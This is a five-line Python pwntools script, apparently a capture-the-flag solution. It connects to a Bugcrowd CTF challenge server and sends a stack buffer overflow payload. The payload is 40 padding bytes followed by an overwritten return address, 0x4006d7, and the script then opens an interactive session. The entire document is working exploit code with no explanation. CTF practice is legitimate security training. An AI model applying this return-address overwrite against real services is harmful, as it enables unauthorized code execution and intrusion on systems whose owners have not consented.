from pwn import *
p=remote('challenges.bhusa.bugcrowdctf.com', 8082)
payload=b'a'*40+p64(0x4006d7)
p.sendline(payload)
p.interactive()
